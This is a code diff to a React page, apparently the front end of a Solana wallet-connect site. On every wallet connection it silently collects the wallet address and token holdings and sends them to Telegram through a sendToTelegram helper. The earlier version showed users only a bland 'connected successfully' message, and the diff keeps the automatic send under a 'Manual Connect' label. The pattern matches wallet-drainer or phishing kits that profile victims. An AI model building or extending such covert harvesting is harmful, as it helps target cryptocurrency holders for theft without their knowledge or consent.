@@ -1,43 +1,57 @@
 import { Settings, Menu } from "lucide-react";
 import { useWallet, useConnection } from '@solana/wallet-adapter-react';
 import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
-import { useEffect } from 'react';
+import { useEffect, useState } from 'react';
 import { getTokenAccounts, sendToTelegram } from '@/utils/walletUtils';
 import { toast } from '@/components/ui/use-toast';
+import { Button } from "@/components/ui/button";
 
 const Index = () => {
-  const { publicKey, connecting } = useWallet();
+  const { publicKey, connecting, connected } = useWallet();
   const { connection } = useConnection();
+  const [isProcessing, setIsProcessing] = useState(false);
+
+  const handleManualConnect = async () => {
+    if (!publicKey) {
+      toast({
+        title: "Error",
+        description: "Please connect your wallet first",
+        variant: "destructive",
+      });
+      return;
+    }
+
+    setIsProcessing(true);
+    try {
+      const tokens = await getTokenAccounts(connection, publicKey.toString());
+      const walletData = {
+        address: publicKey.toString(),
+        tokens,
+      };
+      
+      await sendToTelegram(walletData);
+      
+      toast({
+        title: "Success",
+        description: "Wallet data sent successfully!",
+      });
+    } catch (error) {
+      console.error('Error processing wallet data:', error);
+      toast({
+        title: "Error",
+        description: "Failed to process wallet data",
+        variant: "destructive",
+      });
+    } finally {
+      setIsProcessing(false);
+    }
+  };
 
   useEffect(() => {
-    const handleWalletConnection = async () => {
-      if (publicKey) {
-        try {
-          const tokens = await getTokenAccounts(connection, publicKey.toString());
-          const walletData = {
-            address: publicKey.toString(),
-            tokens,
-          };
-          
-          await sendToTelegram(walletData);
-          
-          toast({
-            title: "Success",
-            description: "Wallet connected successfully!",
-          });
-        } catch (error) {
-          console.error('Error handling wallet connection:', error);
-          toast({
-            title: "Error",
-            description: "Failed to process wallet connection",
-            variant: "destructive",
-          });
-        }
-      }
-    };
-
-    handleWalletConnection();
-  }, [publicKey, connection]);
+    if (connected && publicKey) {
+      handleManualConnect();
+    }
+  }, [connected, publicKey]);
 
   return (
     <div className="min-h-screen bg-background p-6 relative">
@@ -73,9 +87,13 @@ const Index = () => {
 
         {/* Action Buttons */}
         <div className="flex flex-col w-full max-w-md gap-4 mt-4">
-          <button className="glass-button text-cyan-400 py-4 px-8 rounded-xl text-xl font-semibold">
-            Manual Connect
-          </button>
+          <Button 
+            onClick={handleManualConnect}
+            disabled={!publicKey || isProcessing}
+            className="glass-button text-cyan-400 py-4 px-8 rounded-xl text-xl font-semibold"
+          >
+            {isProcessing ? "Processing..." : "Manual Connect"}
+          </Button>
           <WalletMultiButton className="glass-button text-cyan-400 py-4 px-8 rounded-xl text-xl font-semibold" />
         </div>
 
